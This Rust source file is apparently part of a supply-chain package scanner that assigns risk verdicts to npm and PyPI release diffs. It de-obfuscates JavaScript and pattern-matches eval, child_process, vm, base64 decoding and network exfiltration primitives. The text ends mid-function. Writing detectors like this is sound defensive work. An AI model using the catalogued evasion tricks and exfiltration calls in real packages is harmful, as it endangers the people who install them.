use crate::advisory::AdvisoryReport;
use crate::diff::{Delta, FileKind};
use crate::policy::Policy;
use crate::provenance::{ProvenanceReport, ProvenanceStatus};
use crate::registry::Ecosystem;
use crate::verdict::{DiffSummary, Finding, TrustSources, Verdict, VerdictBand};

#[allow(dead_code)]
pub fn evaluate(
    name: &str,
    ecosystem: Ecosystem,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
) -> Verdict {
    evaluate_with_policy(
        name,
        ecosystem,
        integrity,
        delta,
        is_unreviewed_baseline,
        &Policy::default(),
    )
}

pub fn evaluate_with_policy(
    name: &str,
    ecosystem: Ecosystem,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
    policy: &Policy,
) -> Verdict {
    evaluate_with_trust(
        name,
        ecosystem,
        integrity,
        delta,
        is_unreviewed_baseline,
        false,
        policy,
        None,
        None,
    )
}

#[allow(clippy::too_many_arguments)]
pub fn evaluate_with_trust(
    name: &str,
    ecosystem: Ecosystem,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
    prior_release_yanked: bool,
    policy: &Policy,
    advisories: Option<&AdvisoryReport>,
    provenance: Option<&ProvenanceReport>,
) -> Verdict {
    let mut findings = Vec::new();

    // P01: Check if package is explicitly blocked by policy
    if policy.is_package_blocked(name, ecosystem) {
        findings.push(Finding {
            rule_id: "P01_PACKAGE_BLOCKED".into(),
            severity: VerdictBand::Block,
            title: format!("Package `{name}` is blocked by policy"),
            description: "The package matches an active blocklist rule in blueline.toml.".into(),
        });
    }

    // Advisory Findings (Phase 2)
    if let Some(adv_rep) = advisories {
        for hit in &adv_rep.hits {
            if hit.is_malware {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_MALWARE".into(),
                    severity: VerdictBand::Block,
                    title: format!("Known malware advisory: {}", hit.id),
                    description: hit.summary.clone(),
                });
            } else if hit.severity == VerdictBand::Block {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_CRITICAL_CVE".into(),
                    severity: VerdictBand::Block,
                    title: format!("Critical vulnerability: {}", hit.id),
                    description: hit.summary.clone(),
                });
            } else {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_CVE".into(),
                    severity: hit.severity,
                    title: format!("Known vulnerability ({}): {}", hit.severity, hit.id),
                    description: hit.summary.clone(),
                });
            }
        }
    }

    // Provenance Findings (Phase 2)
    if let Some(prov_rep) = provenance {
        if prov_rep.status == ProvenanceStatus::FailedMismatch {
            findings.push(Finding {
                rule_id: "P03_PROVENANCE_DIGEST_MISMATCH".into(),
                severity: VerdictBand::Block,
                title: "Provenance digest mismatch".into(),
                description: prov_rep.message.clone().unwrap_or_else(|| {
                    "Tarball SHA512 does not match in-toto attestation subject digest".into()
                }),
            });
        }

        if (policy.policy.require_provenance || policy.provenance.require_provenance)
            && prov_rep.status != ProvenanceStatus::Verified
        {
            findings.push(Finding {
                rule_id: "P03_PROVENANCE_REQUIRED_MISSING".into(),
                severity: VerdictBand::Block,
                title: "Required build provenance missing".into(),
                description:
                    "Policy requires verified SLSA build provenance, but none was present.".into(),
            });
        }

        if policy.provenance.require_signatures && !prov_rep.registry_signature_present {
            findings.push(Finding {
                rule_id: "P03_SIGNATURE_REQUIRED_MISSING".into(),
                severity: VerdictBand::Block,
                title: "Required registry signature missing".into(),
                description:
                    "Policy requires npm registry signatures, but no valid signature was attached."
                        .into(),
            });
        }

        if !policy.provenance.allowed_repositories.is_empty()
            && let Some(ref repo) = prov_rep.source_repo
        {
            let allowed = policy
                .provenance
                .allowed_repositories
                .iter()
                .any(|a| is_repo_allowed(repo, a));
            if !allowed {
                findings.push(Finding {
                    rule_id: "P03_UNAUTHORIZED_BUILD_REPO".into(),
                    severity: VerdictBand::Block,
                    title: format!("Unauthorized source repository `{repo}`"),
                    description:
                        "The build provenance repository is not in the allowed repositories list."
                            .into(),
                });
            }
        }
    }

    // R01: Lifecycle scripts
    for script in &delta.new_lifecycle_scripts {
        if policy.is_script_allowed(name, script, ecosystem) {
            findings.push(Finding {
                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
                severity: VerdictBand::Low,
                title: format!("Allowed lifecycle script: `{script}`"),
                description: format!(
                    "The lifecycle script `{script}` is explicitly allowed by policy allowlist."
                ),
            });
        } else {
            findings.push(Finding {
                rule_id: "R01_LIFECYCLE_SCRIPT_ADDED".into(),
                severity: if policy.policy.block_unreviewed_scripts {
                    VerdictBand::Block
                } else {
                    VerdictBand::High
                },
                title: format!("New install-time lifecycle script: `{script}`"),
                description: format!(
                    "The package added `{script}` to package.json scripts which executes automatically on install."
                ),
            });
        }
    }

    for script in &delta.modified_lifecycle_scripts {
        if policy.is_script_allowed(name, script, ecosystem) {
            findings.push(Finding {
                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
                severity: VerdictBand::Low,
                title: format!("Allowed modified lifecycle script: `{script}`"),
                description: format!(
                    "The modified lifecycle script `{script}` is explicitly allowed by policy allowlist."
                ),
            });
        } else {
            findings.push(Finding {
                rule_id: "R01_LIFECYCLE_SCRIPT_MODIFIED".into(),
                severity: VerdictBand::High,
                title: format!("Modified lifecycle script: `{script}`"),
                description: format!(
                    "The command for lifecycle script `{script}` was modified between releases."
                ),
            });
        }
    }

    // Native build trigger: binding.gyp in root triggers node-gyp rebuild on install
    let binding_allowed = policy.is_script_allowed(name, "binding.gyp", ecosystem)
        || policy.is_script_allowed(name, "node-gyp", ecosystem);
    if delta.binding_gyp_added
        || delta
            .files_added
            .iter()
            .any(|f| f.relative_path == "binding.gyp")
    {
        findings.push(Finding {
            rule_id: if binding_allowed {
                "P02_BINDING_GYP_ALLOWED".into()
            } else {
                "R01_BINDING_GYP_ADDED".into()
            },
            severity: if binding_allowed {
                VerdictBand::Low
            } else {
                VerdictBand::Block
            },
            title: if binding_allowed {
                "Allowed native build trigger: `binding.gyp`".into()
            } else {
                "Automated native build trigger: `binding.gyp`".into()
            },
            description: "The package added `binding.gyp` in root which triggers `node-gyp rebuild` automatically on install.".into(),
        });
    } else if delta
        .files_modified
        .iter()
        .any(|f| f.relative_path == "binding.gyp")
    {
        findings.push(Finding {
            rule_id: if binding_allowed {
                "P02_BINDING_GYP_ALLOWED".into()
            } else {
                "R01_BINDING_GYP_MODIFIED".into()
            },
            severity: if binding_allowed {
                VerdictBand::Low
            } else {
                VerdictBand::High
            },
            title: if binding_allowed {
                "Allowed native build file: `binding.gyp`".into()
            } else {
                "Modified native build file: `binding.gyp`".into()
            },
            description: "The `binding.gyp` native build configuration was modified between releases.".into(),
        });
    }

    // R02: Native executables or binaries
    for exe in &delta.new_executables {
        findings.push(Finding {
            rule_id: "R02_EXECUTABLE_ADDED".into(),
            severity: VerdictBand::High,
            title: format!("Executable or script added: `{exe}`"),
            description: format!(
                "File `{exe}` has an executable extension or executable filesystem permissions."
            ),
        });
    }

    // R02: Opaque oversized files added/modified
    for file in &delta.files_added {
        if file.kind == FileKind::OpaqueTooLarge {
            findings.push(Finding {
                rule_id: "R02_OPAQUE_LARGE_FILE_ADDED".into(),
                severity: VerdictBand::High,
                title: format!("Opaque oversized file added: `{}`", file.relative_path),
                description: format!(
                    "File `{}` exceeds the diff inspection cap and cannot be inspected as text.",
                    file.relative_path
                ),
            });
        }
    }
    for file in &delta.files_modified {
        if file.kind == FileKind::OpaqueTooLarge {
            findings.push(Finding {
                rule_id: "R02_OPAQUE_LARGE_FILE_ADDED".into(),
                severity: VerdictBand::High,
                title: format!("Opaque oversized file modified: `{}`", file.relative_path),
                description: format!(
                    "File `{}` exceeds the diff inspection cap and cannot be inspected as text.",
                    file.relative_path
                ),
            });
        }
    }

    for bin in &delta.new_binaries {
        if !delta.new_executables.contains(bin) {
            let is_opaque_large = delta
                .files_added
                .iter()
                .chain(delta.files_modified.iter())
                .any(|f| &f.relative_path == bin && f.kind == FileKind::OpaqueTooLarge);
            if !is_opaque_large {
                findings.push(Finding {
                    rule_id: "R02_BINARY_BLOB_ADDED".into(),
                    severity: VerdictBand::High,
                    title: format!("Binary or opaque blob added: `{bin}`"),
                    description: format!(
                        "File `{bin}` contains NUL bytes or non-UTF-8 content and cannot be inspected as text."
                    ),
                });
            }
        }
    }

    for bin in &delta.modified_binaries {
        findings.push(Finding {
            rule_id: "R02_BINARY_BLOB_MODIFIED".into(),
            severity: VerdictBand::High,
            title: format!("Binary or opaque blob modified: `{bin}`"),
            description: format!(
                "Pre-existing binary file `{bin}` was modified or replaced between releases."
            ),
        });
    }

    // R03: Suspicious code in text diffs (eval, child_process, base64 payload)
    for file in delta.files_added.iter().chain(delta.files_modified.iter()) {
        if file.kind == FileKind::Text
            && let Some(diff_text) = &file.unified_diff
        {
            scan_diff_for_suspicious_patterns(&file.relative_path, diff_text, &mut findings);
        }
    }

    // R04: Dependency changes
    if !delta.new_dependencies.is_empty() {
        let deps_str = delta
            .new_dependencies
            .iter()
            .map(|(d, v)| format!("{d}@{v}"))
            .collect::<Vec<_>>()
            .join(", ");
        let has_suspicious_url = delta
            .new_dependencies
            .iter()
            .any(|(_, v)| is_non_semver_url(v));

        findings.push(Finding {
            rule_id: "R04_DEPENDENCY_ADDED".into(),
            severity: if has_suspicious_url {
                VerdictBand::High
            } else {
                VerdictBand::Medium
            },
            title: format!(
                "{} new runtime dependencies added",
                delta.new_dependencies.len()
            ),
            description: format!("Added dependencies: {deps_str}"),
        });
    }

    for (dep, old_ver, new_ver) in &delta.modified_dependencies {
        if is_non_semver_url(new_ver) {
            findings.push(Finding {
                rule_id: "R04_DEPENDENCY_MODIFIED".into(),
                severity: VerdictBand::High,
                title: format!("Dependency `{dep}` changed to non-semver URL"),
                description: format!(
                    "Dependency `{dep}` version modified from `{old_ver}` to suspicious URL `{new_ver}`."
                ),
            });
        }
    }

    // R05: Large diff anomaly on patch or non-standard semver
    if let Some(base_ver_str) = &delta.baseline_version {
        match (
            semver::Version::parse(base_ver_str),
            semver::Version::parse(&delta.target_version),
        ) {
            (Ok(base_v), Ok(target_v)) => {
                if base_v.major == target_v.major
                    && base_v.minor == target_v.minor
                    && delta.total_lines_added > 500
                {
                    findings.push(Finding {
                        rule_id: "R05_LARGE_PATCH_DIFF".into(),
                        severity: VerdictBand::Medium,
                        title: format!("Large patch delta (+{} lines)", delta.total_lines_added),
                        description: format!(
                            "Patch release {base_v} -> {target_v} added {} lines across {} files.",
                            delta.total_lines_added,
                            delta.files_added.len() + delta.files_modified.len()
                        ),
                    });
                }
            }
            _ => {
                findings.push(Finding {
                    rule_id: "R05_NON_STANDARD_VERSION".into(),
                    severity: VerdictBand::Medium,
                    title: "Non-standard version format".into(),
                    description: format!(
                        "Baseline `{base_ver_str}` or target `{}` does not conform to strict semver.",
                        delta.target_version
                    ),
                });
            }
        }
    }

    // R06: First sighting
    if delta.baseline_version.is_none() {
        let severity = if policy.allows_unreviewed_baseline(name, ecosystem) {
            VerdictBand::Low
        } else {
            VerdictBand::Medium
        };
        findings.push(Finding {
            rule_id: "R06_FIRST_SIGHTING".into(),
            severity,
            title: "First sighting: no known-clean baseline exists".into(),
            description: "No previous version was found to diff against; full tarball inspected."
                .into(),
        });
    }

    // R07: Unreviewed predecessor baseline
    if is_unreviewed_baseline {
        let base_ver = delta.baseline_version.as_deref().unwrap_or("unknown");
        let severity = if policy.allows_unreviewed_baseline(name, ecosystem) {
            VerdictBand::Low
        } else {
            VerdictBand::Medium
        };
        findings.push(Finding {
            rule_id: "R07_UNREVIEWED_PREDECESSOR_BASELINE".into(),
            severity,
            title: format!("Unreviewed baseline version `{base_ver}`"),
            description: format!(
                "Baseline version `{base_ver}` was selected from registry history and has not been approved locally."
            ),
        });
    }

    // R08: Immediate prior release yanked from the registry
    if prior_release_yanked {
        let prior_ver = delta
            .baseline_version
            .as_deref()
            .map(|b| b.to_string())
            .unwrap_or_else(|| "the previous release".to_string());
        findings.push(Finding {
            rule_id: "R08_YANKED_PREDECESSOR".into(),
            severity: VerdictBand::Medium,
            title: format!("Release immediately preceding `{}` was yanked", delta.target_version),
            description: format!(
                "The release immediately before `{}` (`{prior_ver}`) was yanked from the registry. Yanked releases are a common supply-chain attack cleanup signal; the diff anchor may be older than expected.",
                delta.target_version
            ),
        });
    }

    // PyPI-specific findings: entry points, native binaries, and sdist build code
    let has_entry_points = delta
        .files_added
        .iter()
        .chain(delta.files_modified.iter())
        .any(|f| {
            f.relative_path.ends_with("entry_points.txt")
                || f.relative_path.contains(".data/scripts/")
                || f.relative_path.contains("data/scripts/")
        });
    if has_entry_points {
        findings.push(Finding {
            rule_id: "R02_ENTRY_POINTS_SCRIPT".into(),
            severity: VerdictBand::Medium,
            title: "New executable entry points or scripts introduced".into(),
            description: "The package adds console_scripts entry points or .data/scripts files that install executables into PATH.".into(),
        });
    }

    let has_native_binary = delta
        .files_added
        .iter()
        .chain(delta.files_modified.iter())
        .any(|f| {
            let p = f.relative_path.to_ascii_lowercase();
            p.ends_with(".so")
                || p.ends_with(".pyd")
                || p.ends_with(".dylib")
                || p.ends_with(".dll")
        });
    if has_native_binary && ecosystem == Ecosystem::PyPi {
        findings.push(Finding {
            rule_id: "R06_NATIVE_PLATFORM_WHEEL".into(),
            severity: VerdictBand::Low,
            title: "Native binary extensions in wheel artifact".into(),
            description:
                "Target artifact contains compiled binary extensions (.so / .pyd / .dylib / .dll)."
                    .into(),
        });
    }

    let has_sdist_setup = delta
        .files_added
        .iter()
        .any(|f| f.relative_path == "setup.py" || f.relative_path == "setup.cfg");
    if has_sdist_setup && ecosystem == Ecosystem::PyPi {
        findings.push(Finding {
            rule_id: "R04_SDIST_BUILD_CODE".into(),
            severity: VerdictBand::Medium,
            title: "Source distribution (sdist) executes build code on install".into(),
            description: "Target artifact is a source distribution containing setup.py/setup.cfg which executes arbitrary code during build/install.".into(),
        });
    }

    let mut score: u32 = 0;
    let mut band = VerdictBand::Low;

    for f in &findings {
        match f.severity {
            VerdictBand::Block => {
                score = score.saturating_add(50);
                band = VerdictBand::Block;
            }
            VerdictBand::High => {
                score = score.saturating_add(25);
                if band < VerdictBand::High {
                    band = VerdictBand::High;
                }
            }
            VerdictBand::Medium => {
                let add = if f.rule_id == "R06_FIRST_SIGHTING" {
                    15
                } else {
                    10
                };
                score = score.saturating_add(add);
                if band < VerdictBand::Medium {
                    band = VerdictBand::Medium;
                }
            }
            VerdictBand::Low => {}
        }
    }

    let capped_score = score.min(100);

    // Escalate according to policy thresholds if accumulated score exceeds them
    if capped_score >= policy.thresholds.block_score {
        band = VerdictBand::Block;
    } else if capped_score > policy.thresholds.max_medium_score && band < VerdictBand::High {
        band = VerdictBand::High;
    } else if capped_score > policy.thresholds.max_low_score && band < VerdictBand::Medium {
        band = VerdictBand::Medium;
    }

    Verdict {
        name: name.to_string(),
        target_version: delta.target_version.clone(),
        baseline_version: delta.baseline_version.clone(),
        integrity: integrity.to_string(),
        ecosystem,
        band,
        risk_score: capped_score,
        findings,
        diff_summary: DiffSummary {
            files_added: delta.files_added.len(),
            files_removed: delta.files_removed.len(),
            files_modified: delta.files_modified.len(),
            lines_added: delta.total_lines_added,
            lines_deleted: delta.total_lines_deleted,
        },
        trust_sources: if advisories.is_some() || provenance.is_some() {
            Some(TrustSources {
                advisories: advisories.cloned(),
                provenance: provenance.cloned(),
            })
        } else {
            None
        },
    }
}

fn is_non_semver_url(v: &str) -> bool {
    const PREFIXES: [&str; 10] = [
        "git",
        "http://",
        "https://",
        "github:",
        "gitlab:",
        "bitbucket:",
        "ssh://",
        "file:",
        "link:",
        "npm:",
    ];
    PREFIXES.iter().any(|&p| {
        if v.len() >= p.len() {
            v[..p.len()].eq_ignore_ascii_case(p)
        } else {
            false
        }
    })
}

fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<Finding>) {
    let mut added_lines = Vec::new();
    for line in diff.lines() {
        if line.starts_with('+') && !line.starts_with("+++ ") && !line.starts_with("+++ b/") {
            added_lines.push(&line[1..]);
        }
    }
    if added_lines.is_empty() {
        return;
    }

    let combined_added = added_lines.join("\n");
    let s_folded = normalize_js(&combined_added);
    let s_clean_lower = s_folded.to_ascii_lowercase();

    if has_eval_invocation(&s_folded) {
        findings.push(Finding {
            rule_id: "R03_EVAL_USAGE".into(),
            severity: VerdictBand::High,
            title: format!("Dynamic code evaluation in `{path}`"),
            description: format!("Diff introduced `eval()` or `new Function()` in `{path}`."),
        });
    }

    if has_child_proc_invocation(&s_folded) {
        findings.push(Finding {
            rule_id: "R03_CHILD_PROCESS".into(),
            severity: VerdictBand::High,
            title: format!("Process execution primitive in `{path}`"),
            description: format!("Diff introduced child_process execution calls in `{path}`."),
        });
    }

    if has_vm_invocation(&s_folded) {
        findings.push(Finding {
            rule_id: "R03_VM_EXECUTION".into(),
            severity: VerdictBand::High,
            title: format!("Dynamic VM code execution in `{path}`"),
            description: format!("Diff introduced Node.js `vm` module execution in `{path}`."),
        });
    }

    if has_network_invocation(&s_folded) {
        findings.push(Finding {
            rule_id: "R03_NETWORK_PRIMITIVE".into(),
            severity: VerdictBand::Medium,
            title: format!("Network request primitive in `{path}`"),
            description: format!(
                "Diff introduced outbound network communication calls in `{path}`."
            ),
        });
    }

    if has_base64_decode(&s_clean_lower) {
        findings.push(Finding {
            rule_id: "R03_BASE64_DECODE".into(),
            severity: VerdictBand::Medium,
            title: format!("Base64 decoding in `{path}`"),
            description: format!("Diff introduced base64 decode calls in `{path}`."),
        });
    }

    for line in added_lines {
        if is_suspicious_high_entropy(line) {
            findings.push(Finding {
                rule_id: "R03_HIGH_ENTROPY".into(),
                severity: VerdictBand::High,
                title: format!("High-entropy obfuscated token in `{path}`"),
                description: format!(
                    "Diff introduced high-entropy obfuscated string/payload in `{path}`."
                ),
            });
            break;
        }
    }
}

fn unescape_js(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek() {
                Some('x') => {
                    chars.next();
                    let mut val = 0u8;
                    let mut count = 0;
                    let mut buf = [0u8; 2];
                    for slot in &mut buf {
                        if let Some(&h) = chars.peek()
                            && h.is_ascii_hexdigit()
                            && let Some(ch) = chars.next()
                        {
                            *slot = ch as u8;
                            val = (val << 4) | (ch.to_digit(16).unwrap_or(0) as u8);
                            count += 1;
                        } else {
                            break;
                        }
                    }
                    if count == 2 {
                        out.push(val as char);
                    } else {
                        out.push('\\');
                        out.push('x');
                        for &b in &buf[..count] {
                            out.push(b as char);
                        }
                    }
                }
                Some('u') => {
                    chars.next();
                    if chars.peek() == Some(&'{') {
                        chars.next();
                        let mut val = 0u32;
                        let mut count = 0;
                        let mut buf = [0u8; 8];
                        let mut closed = false;
                        while let Some(&h) = chars.peek() {
                            if h == '}' {
                                chars.next();
                                closed = true;
                                break;
                            }
                            if h.is_ascii_hexdigit()
                                && count < 8
                                && let Some(ch) = chars.next()
                            {
                                buf[count] = ch as u8;
                                val = (val << 4) | ch.to_digit(16).unwrap_or(0);
                                count += 1;
                            } else {
                                break;
                            }
                        }
                        if closed
                            && count > 0
                            && let Some(ch) = char::from_u32(val)
                        {
                            out.push(ch);
                        } else {
                            out.push('\\');
                            out.push('u');
                            out.push('{');
                            for &b in &buf[..count] {
                                out.push(b as char);
                            }
                            if closed {
                                out.push('}');
                            }
                        }
                    } else {
                        let mut val = 0u32;
                        let mut count = 0;
                        let mut buf = [0u8; 4];
                        for slot in &mut buf {
                            if let Some(&h) = chars.peek()
                                && h.is_ascii_hexdigit()
                                && let Some(ch) = chars.next()
                            {
                                *slot = ch as u8;
                                val = (val << 4) | ch.to_digit(16).unwrap_or(0);
                                count += 1;
                            } else {
                                break;
                            }
                        }
                        if count == 4
                            && let Some(ch) = char::from_u32(val)
                        {
                            out.push(ch);
                        } else {
                            out.push('\\');
                            out.push('u');
                            for &b in &buf[..count] {
                                out.push(b as char);
                            }
                        }
                    }
                }
                Some(&d) if ('0'..='7').contains(&d) => {
                    // Octal escape sequence (e.g. \145 \166 \141 \154)
                    let mut val = 0u8;
                    let mut count = 0;
                    let mut buf = [0u8; 3];
                    if let Some(first) = chars.next() {
                        buf[count] = first as u8;
                        val = first.to_digit(8).unwrap_or(0) as u8;
                        count += 1;
                    }
                    for _ in 0..2 {
                        if let Some(&o) = chars.peek()
                            && ('0'..='7').contains(&o)
                            && let Some(ch) = chars.next()
                        {
                            buf[count] = ch as u8;
                            val = (val << 3) | (ch.to_digit(8).unwrap_or(0) as u8);
                            count += 1;
                        } else {
                            break;
                        }
                    }
                    out.push(val as char);
                }
                _ => {
                    out.push(c);
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn is_ignorable_js_char(c: char) -> bool {
    c.is_whitespace()
        || c == '\u{200B}' // Zero-width space
        || c == '\u{200C}' // Zero-width non-joiner
        || c == '\u{200D}' // Zero-width joiner
        || c == '\u{FEFF}' // Zero-width no-break space / BOM
        || c == '\u{00AD}' // Soft hyphen
        || c == '\u{2060}' // Word joiner
        || c == '\u{180E}' // Mongolian vowel separator
        || c == '\u{200E}' // Left-to-right mark
        || c == '\u{200F}' // Right-to-left mark
        || c == '\u{202A}' // Left-to-right embedding
        || c == '\u{202B}' // Right-to-left embedding
        || c == '\u{202C}' // Pop directional formatting
        || c == '\u{202D}' // Left-to-right override
        || c == '\u{202E}' // Right-to-left override
        || c == '\u{2066}' // Left-to-right isolate
        || c == '\u{2067}' // Right-to-left isolate
        || c == '\u{2068}' // First strong isolate
        || c == '\u{2069}' // Pop directional isolate
}

fn strip_comments_and_whitespace(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    let mut in_quote: Option<char> = None;
    while let Some(c) = chars.next() {
        if let Some(q) = in_quote {
            if c == '\\' {
                out.push(c);
                if let Some(escaped) = chars.next() {
                    out.push(escaped);
                }
                continue;
            }
            if c == q {
                in_quote = None;
            }
            if !is_ignorable_js_char(c) {
                out.push(c);
            }
            continue;
        }

        if c == '?' && chars.peek() == Some(&'.') {
            chars.next();
            if chars.peek() == Some(&'(') {
                continue;
            } else {
                out.push('.');
                continue;
            }
        }

        if c == '"' || c == '\'' || c == '`' {
            in_quote = Some(c);
            out.push(c);
            continue;
        }

        if c == '/' {
            if let Some(&'*') = chars.peek() {
                chars.next();
                while let Some(ch) = chars.next() {
                    if ch == '*' && chars.peek() == Some(&'/') {
                        chars.next();
                        break;
                    }
                }
                continue;
            } else if let Some(&'/') = chars.peek() {
                chars.next();
                for ch in chars.by_ref() {
                    if ch == '\n' {
                        break;
                    }
                }
                continue;
            }
        }
        if !is_ignorable_js_char(c) {
            out.push(c);
        }
    }
    out
}

fn fold_adjacent_string_literals(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '"' || c == '\'' || c == '`' {
            let quote = c;
            let mut current_literal = String::new();
            let mut terminated = false;

            while let Some(ch) = chars.next() {
                if ch == '\\' {
                    current_literal.push(ch);
                    if let Some(escaped) = chars.next() {
                        current_literal.push(escaped);
                    }
                    continue;
                }
                if ch == quote {
                    terminated = true;
                    break;
                }
                current_literal.push(ch);
            }

            if terminated {
                while chars.peek() == Some(&'+') {
                    let mut lookahead = chars.clone();
                    lookahead.next();
                    if let Some(&next_q) = lookahead.peek()
                        && (next_q == '"' || next_q == '\'' || next_q == '`')
                    {
                        chars.next();
                        chars.next();
                        let mut next_literal = String::new();
                        let mut next_terminated = false;
                        while let Some(ch) = chars.next() {
                            if ch == '\\' {
                                next_literal.push(ch);
                                if let Some(escaped) = chars.next() {
                                    next_literal.push(escaped);
                                }
                                continue;
                            }
                            if ch == next_q {
                                next_terminated = true;
                                break;
                            }
                            next_literal.push(ch);
                        }
                        if next_terminated {
                            current_literal.push_str(&next_literal);
                        } else {
                            out.push(quote);
                            out.push_str(&current_literal);
                            out.push(quote);
                            out.push('+');
                            out.push(next_q);
                            out.push_str(&next_literal);
                            current_literal.clear();
                            terminated = false;
                            break;
                        }
                    } else {
                        break;
                    }
                }
                if (!current_literal.is_empty() || terminated) && terminated {
                    out.push(quote);
                    out.push_str(&current_literal);
                    out.push(quote);
                }
            } else {
                out.push(quote);
                out.push_str(&current_literal);
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn normalize_js(s: &str) -> String {
    let unescaped = unescape_js(s);
    let cleaned = strip_comments_and_whitespace(&unescaped);
    let folded_codes = fold_char_code_calls(&cleaned);
    fold_adjacent_string_literals(&folded_codes)
}

/// Rewrites `String.fromCharCode(99,104,...)` and `String.fromCodePoint(...)`
/// into a quoted string literal so downstream detectors see the reconstructed
/// text. Calls whose arguments cannot be parsed as plain integer literals are
/// left untouched.
fn fold_char_code_calls(s: &str) -> String {
    const MARKERS: [&str; 2] = ["fromCharCode(", "fromCodePoint("];
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    let mut search_from = 0;
    let mut cached: [Option<Option<usize>>; 2] = [None; 2];
    loop {
        let mut hit: Option<(usize, usize)> = None;
        for (idx, m) in MARKERS.iter().enumerate() {
            let abs = match cached[idx] {
                Some(p) => p,
                None => {
                    let p = rest[search_from..].find(m).map(|q| search_from + q);
                    cached[idx] = Some(p);
                    p
                }
            };
            if let Some(a) = abs {
                hit = Some(match hit {
                    Some((hp, hi)) if hp <= a => (hp, hi),
                    _ => (a, idx),
                });
            }
        }
        let Some((pos, idx)) = hit else { break };
        let args_start = pos + MARKERS[idx].len();
        match parse_code_point_args(&rest[args_start..]) {
            Some((codes, consumed)) => match quoted_literal(&codes) {
                Some(literal) => {
                    let call_start = if rest[..pos].ends_with("String.") {
                        pos - "String.".len()
                    } else {
                        pos
                    };
                    out.push_str(&rest[..call_start]);
                    out.push_str(&literal);
                    rest = &rest[args_start + consumed..];
                    search_from = 0;
                    cached = [None; 2];
                }
                None => {
                    search_from = args_start;
                    cached[idx] = None;
                }
            },
            None => {
                search_from = args_start;
                cached[idx] = None;
            }
        }
    }
    out.push_str(rest);
    out
}

fn parse_code_point_args(s: &str) -> Option<(Vec<u32>, usize)> {
    let bytes = s.as_bytes();
    let mut i = 0;
    let mut codes = Vec::new();
    loop {
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        if i >= bytes.len() {
            return None;
        }
        let val = if bytes[i] == b'0' && i + 1 < bytes.len() && (bytes[i + 1] | 0x20) == b'x' {
            i += 2;
            let start = i;
            while i < bytes.len() && bytes[i].is_ascii_hexdigit() {
                i += 1;
            }
            if i == start {
                return None;
            }
            u32::from_str_radix(&s[start..i], 16).ok()?
        } else {
            let start = i;
            while i < bytes.len() && bytes[i].is_ascii_digit() {
                i += 1;
            }
            if i == start {
                return None;
            }
            s[start..i].parse::<u32>().ok()?
        };
        codes.push(val);
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        match bytes.get(i) {
            Some(b',') => i += 1,
            Some(b')') => return Some((codes, i + 1)),
            _ => return None,
        }
    }
}

fn quoted_literal(codes: &[u32]) -> Option<String> {
    let text: String = codes
        .iter()
        .map(|&c| char::from_u32(c))
        .collect::<Option<Vec<_>>>()?
        .into_iter()
        .collect();
    for q in ['\'', '"', '`'] {
        if !text.contains(q) && !text.contains('\\') {
            return Some(format!("{q}{text}{q}"));
        }
    }
    None
}

fn contains_module_import(s: &str, module: &str) -> bool {
    const PREFIXES: [&str; 3] = ["require(", "import(", "from"];
    const QUOTES: [char; 3] = ['\'', '"', '`'];

    for prefix in PREFIXES {
        let mut search_idx = 0;
        while let Some(pos) = s[search_idx..].find(prefix) {
            let start = search_idx + pos + prefix.len();
            let remainder = &s[start..];
            for q in QUOTES {
                if let Some(rest) = remainder.strip_prefix(q)
                    && let Some(after_mod) = rest.strip_prefix(module)
                    && after_mod.starts_with(q)
                {
                    return true;
                }
            }
            search_idx = start;
        }
    }
    false
}

fn has_vm_invocation(s_clean: &str) -> bool {
    s_clean.contains("vm.runInThisContext")
        || s_clean.contains("vm.runInNewContext")
        || s_clean.contains("vm.runInContext")
        || s_clean.contains("vm.compileFunction")
        || s_clean.contains("compileFunction(")
        || s_clean.contains("vm.Script(")
        || s_clean.contains("vm.createScript(")
        || s_clean.contains("runInThisContext(")
        || s_clean.contains("runInNewContext(")
        || contains_module_import(s_clean, "vm")
        || contains_module_import(s_clean, "node:vm")
}

#[cfg(test)]
fn is_vm_invocation(s: &str) -> bool {
    has_vm_invocation(&normalize_js(s))
}

fn contains_call(s: &str, target: &str) -> bool {
    let mut search_idx = 0;
    while let Some(found) = s[search_idx..].find(target) {
        let actual_idx = search_idx + found;
        let is_start = actual_idx == 0;
        let prev_is_ident = if is_start {
            false
        } else {
            let prev_char = s[..actual_idx].chars().next_back().unwrap_or(' ');
            prev_char.is_ascii_alphanumeric() || prev_char == '_' || prev_char == '$'
        };

        if !prev_is_ident {
            return true;
        }
        search_idx = actual_idx + target.len();
    }
    false
}

fn has_network_invocation(s_clean: &str) -> bool {
    const NETWORK_MODULES: &[&str] = &[
        "http",
        "https",
        "net",
        "tls",
        "dgram",
        "http2",
        "dns",
        "undici",
        "axios",
        "node:http",
        "node:https",
        "node:net",
        "node:tls",
        "node:dgram",
        "node:http2",
        "node:dns",
        "node-fetch",
        "got",
        "superagent",
        "request",
        "urllib",
        "phin",
        "needle",
        "bent",
        "cross-fetch",
    ];

    contains_call(s_clean, "fetch(")
        || contains_call(s_clean, "fetch`")
        || contains_call(s_clean, "WebSocket(")
        || contains_call(s_clean, "sendBeacon(")
        || contains_call(s_clean, "EventSource(")
        || s_clean.contains("http.request(")
        || s_clean.contains("http.get(")
        || s_clean.contains("https.request(")
        || s_clean.contains("https.get(")
        || s_clean.contains("net.connect(")
        || s_clean.contains("tls.connect(")
        || s_clean.contains("dgram.createSocket(")
